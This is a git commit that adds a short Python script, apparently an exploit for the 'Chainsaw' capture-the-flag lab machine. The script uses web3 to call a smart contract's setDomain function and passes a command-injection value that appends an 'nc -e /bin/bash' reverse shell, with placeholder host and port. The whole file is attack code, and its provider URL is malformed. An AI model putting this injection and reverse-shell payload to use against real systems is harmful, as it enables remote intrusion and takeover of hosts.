d93cbbac48f3e63031f64f1d4b1cc8ed73da45d7
lnwza777 <81301788+lnwza777@users.noreply.github.com>
2021-06-24 04:04:55 +0700

    Add files via upload

---
+++ chainsaw.py
@@ -0,0 +1,21 @@
+#!/usr/bin/python3
+
+from web3 import Web3
+import json
+
+w3 = Web3(Web3.HTTPProvider('http:10.10.10.142:9810'))
+print (w3.isConnected)
+
+target_address = open('address.txt','r').read()
+target_address = target_address.replace('\n','')
+print ("Target address: "+ target_address)
+
+with open('WeaponizedPing.json') as f:
+    testData = json.load(f)
+
+w3.eth.defaultAccount = w3.eth.accounts[0]
+contract = w3.eth.contract(address=target_address,abi=testData['abi'])
+#REC payload reverse shell
+payload = 'ip; nc -e /bin/bash ip port'
+
+contract.functions.setDomain(payload).transact()
